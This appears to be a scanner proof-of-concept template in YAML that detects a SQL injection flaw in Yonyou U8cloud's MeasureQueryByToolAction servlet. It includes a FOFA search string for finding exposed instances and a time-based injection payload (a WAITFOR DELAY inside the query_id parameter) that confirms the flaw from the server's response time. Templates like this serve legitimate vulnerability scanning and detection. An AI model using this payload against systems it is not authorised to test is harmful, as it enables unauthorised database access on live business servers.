id: poc-yaml-yongyou-u8cloud-measurequerybytoolaction-sqli
info:
  name: 用友U8cloud MeasureQueryByToolAction SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8cloud
  fofa: body="开启U8 cloud云端之旅"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryByToolAction&method=execute&query_id=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--+
  expression: status_code == 200 && contains(body,"iUFO") && contains(body,"yonyoucloud")
    && duration > t1 && duration < t2
transport: http
